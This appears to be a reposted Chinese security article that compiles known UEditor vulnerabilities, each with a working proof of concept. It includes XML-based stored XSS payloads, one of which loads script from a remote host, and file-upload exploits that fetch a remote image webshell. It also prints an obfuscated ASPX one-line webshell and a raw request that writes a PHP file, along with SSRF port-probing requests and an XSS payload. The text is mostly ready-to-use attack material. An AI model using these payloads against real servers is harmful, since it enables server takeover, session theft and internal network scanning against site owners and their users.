**0x01 前言**

这篇文章是在某知识星球里看到的，感觉这位师傅总结的挺好，将网上已公开的Ueditor编辑器漏洞都整合在一起了，所以想着通过公众号让更多有需要的人看到，如作者看到这文章认为有不妥，还请联系删除，谢谢！

**0x02 XML文件上传导致存储型XSS**

测试版本：php版 v1.4.3.3

下载地址：<https://github.com/fex-team/ueditor>

**复现步骤：**

1.上传一个图片文件

![图片](https://shs3.b.qianxin.com/butian_public/f1ecae6e05f2854dab5ba7877fb7a8e33.jpg)

\\2. 然后buprsuit抓包拦截

![图片](https://shs3.b.qianxin.com/butian_public/f407a228076d9082096d9e82b514ae388.jpg)

3.将uploadimage类型改为uploadfile，并修改文件后缀名为xml,最后复制上xml代码即可

![图片](https://shs3.b.qianxin.com/butian_public/fa7b9cc0eb568383891760995f8f6570e.jpg)

4.即可弹出xss

![图片](https://shs3.b.qianxin.com/butian_public/fe7fc2e7ec81bbfdff3f1ef17afc188fe.jpg)

请注意controller.xxx的访问路径

- 

```php
http://192.168.10.1/ueditor1433/php/controller.php?action=listfile
```

![图片](https://shs3.b.qianxin.com/butian_public/fce9b9d6bfbf06a5c8b02c4a48e4fa57e.jpg)

**常见的xml弹窗POC：**

弹窗xss：

- 
- 
- 
- 
- 
- 
- 
- 

```php
<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1);</something:script></body></html>
```

URL跳转：

- 
- 
- 
- 
- 
- 
- 
- 

```php
<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">window.location.href="https://www.t00ls.net/";</something:script></body></html>
```

远程加载Js：

- 
- 
- 
- 
- 
- 
- 

```php
<html><head></head><body><something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script></body></html>
```

**常用的上传路径：**

- 
- 
- 
- 
- 
- 
- 
- 
- 

```php
/ueditor/index.html/ueditor/asp/controller.asp?action=uploadimage/ueditor/asp/controller.asp?action=uploadfile/ueditor/net/controller.ashx?action=uploadimage/ueditor/net/controller.ashx?action=uploadfile/ueditor/php/controller.php?action=uploadfile/ueditor/php/controller.php?action=uploadimage/ueditor/jsp/controller.jsp?action=uploadfile/ueditor/jsp/controller.jsp?action=uploadimage
```

**常用的上传路径：**

- 
- 

```php
/ueditor/net/controller.ashx?action=listfile/ueditor/net/controller.ashx?action=listimage
```

**0x03 文件上传漏洞**

**1. NET版本文件上传**

该任意文件上传漏洞存在于1.4.3.3、1.5.0和1.3.6版本中，并且只有**.NET**版本受该漏洞影响。黑客可以利用该漏洞上传木马文件，执行命令控制服务器。

![图片](https://shs3.b.qianxin.com/butian_public/f74cd3d2081a63c68e57d806bdc399ddb.jpg)

ueditor中已经下架.net版本，但历史版本中可以下载1.4.3版本，但是否是1.4.3.3目前还没验证。

![图片](https://shs3.b.qianxin.com/butian_public/f6bbc96c48298e70537a90de87d8bc18f.jpg)

该漏洞是由于上传文件时，使用的CrawlerHandler类未对文件类型进行检验，导致了任意文件上传。1.4.3.3和1.5.0版本利用方式稍有不同，1.4.3.3需要一个能正确解析的域名。而1.5.0用IP和普通域名都可以。相对来说1.5.0版本更加容易触发此漏洞；而在1.4.3.3版本中攻击者需要提供一个正常的域名地址就可以绕过判断；

**(1) ueditor .1.5.0.net版本**

首先1.5.0版本进行测试，需要先在外网服务器上传一个图片木马，比如:1.jpg/1.gif/1.png都可以，下面x.x.x.x是外网服务器地址，source\[\]参数值改为图片木马地址，并在结尾加上“?.aspx”即可getshell，利用POC：

- 
- 

```php
POST /ueditor/net/controller.ashx?action=catchimagesource%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx
```

![图片](https://shs3.b.qianxin.com/butian_public/f44efb4abec235cf1e34fa7003eb9c9ef.jpg)

**(2) ueditor.1.4.3.3 .net版**

1.本地构造一个html，因为不是上传漏洞所以enctype 不需要指定为multipart/form-data， 之前见到有poc指定了这个值。完整的poc如下：

- 
- 
- 
- 

```php
<form action="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST">  <p>shell addr: <input type="text" name="source[]" /></p >  <input type="submit" value="Submit" /></form>
```

![图片](https://shs3.b.qianxin.com/butian_public/fa902338c77bce6da93a777dc367b7aed.jpg)

2.需准备一个图片马儿，远程shell地址需要指定扩展名为 1.gif?.aspx，1.gif图片木马（一句话木马：密码：hello）如下：

- 
- 
- 
- 
- 
- 
- 
- 
- 

```php
GIF89a<script runat="server" language="JScript">   function popup(str) {       var q = "u";       var w = "afe";       var a = q + "ns" + w; var b= eval(str,a); return(b);  }</script><% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJoZWxsbyJd")))); %>
```

![图片](https://shs3.b.qianxin.com/butian_public/fa56fbc7ba865be0129d63a8d5da09bf4.jpg)

成功后，会返回马儿地址。

**(3) ueditor.1.3.6 .net1版本**

使用%00截断的方式上传绕过

![图片](https://shs3.b.qianxin.com/butian_public/f959742dfd0a820ef22d9a4e7c3733066.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/f56185fd98154ccad0c1751e7dcc9640a.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/f941209dd4d89049d09c16dd9db323c88.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/f169e66ff7626a819e6a166a70bdebdf3.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/fd5eb864270c20be82ef82664c9e5c5ba.jpg)

**0x04 PHP版本的文件上传**

**利用poc：**

- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 

```php
POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/fuck&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=fuck HTTP/1.1Host: localhostConnection: keep-aliveContent-Length: 222Cache-Control: max-age=0Origin: nullUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/60.0.3112.78 Safari/537.36Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxAAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4———WebKitFormBoundaryDMmqvK6b3ncX4xxAContent-Disposition: form-data; name="fuck"; filename="fuck.php"Content-Type: application/octet-stream<?php phpinfo();?>———WebKitFormBoundaryDMmqvK6b3ncX4xxA—
shell路径由CONFIG[imagePathFormat]=ueditor/php/upload/fuck决定http://localhost/ueditor/php/upload/fuck.php
```

**0x05 SSRF漏洞**

该漏洞存在于1.4.3的jsp版本中。但1.4.3.1版本已经修复了该漏洞。

![图片](https://shs3.b.qianxin.com/butian_public/f1e1f2c924266acdbc44b18d05e9395c4.jpg)

已知该版本ueditor的ssrf触发点：

- 
- 
- 

```php
/jsp/controller.jsp?action=catchimage&source[]=/jsp/getRemoteImage.jsp?upfile=/php/controller.php?action=catchimage&source[]=
```

使用百度logo构造poc：

- 

```php
http://1.1.1.1:8080/cmd/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
```

Poc如下，同样是该controller文件，构造source参数，即可进行内网相关端口探测。

- 
- 
- 

```php
/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
```

这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点：

1.如果抓取不存在的图片地址时，页面返回如下，即state为“远程连接出错”。

- 

```php
{“state”: “SUCCESS”, list:[{“state”:"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}
```

2.如果成功抓取到图片，页面返回如下，即state为“SUCCESS”。

- 

```php
{“state”: “SUCCESS”, list: [{“state”:“SUCCESS”,“size”:“5103”,“source”:“http://192.168.135.133:8080/tomcat.png”,“title”:“1527173588127099881.png”,“url”:"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"}]}
```

3.如果主机无法访问，页面返回如下，即state为“抓取远程图片失败”。

- 

```php
{“state”:“SUCCESS”, list: [{“state”:“\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25”}]}
```

还有一个版本的ssrf漏洞 ，存在于onethink 1.0中的ueditor，测试版本为1.2直接贴Poc：

- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 

```php
POST http://target/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1Host: targetUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 37Connection: keep-alive
upfile=https://www.google.com/?%23.jpg
```

**0x06 另一处XSS漏洞**

首先安装部署环境：

- 

```php
https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3
```

存储型XSS需要写入后端数据库，这里要把编辑器部署到一个可与数据库交互的环境中。首先我们打开编辑器输入正常的文本。

![图片](https://shs3.b.qianxin.com/butian_public/fe93c15ad8fb38c27a259c2ffded5d387.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/fc7bc7578a70b6f1392305b88cb933885.jpg)

抓包并将&lt;p&gt;标签以及原本的文本删除：

![图片](https://shs3.b.qianxin.com/butian_public/fae230a8b5e760fba36a59c6ab4ce2206.jpg)

插入payload：

- 

```php
%3Cp%3E1111111"><ImG sRc=1 OnErRoR=prompt(1)>%3Cbr%2F%3E%3C%2Fp%3E
```

![图片](https://shs3.b.qianxin.com/butian_public/fb76ebaf752f97b7b8ede4d4d0b0509c8.jpg)

文章授权转载于**"潇湘信安"**公众号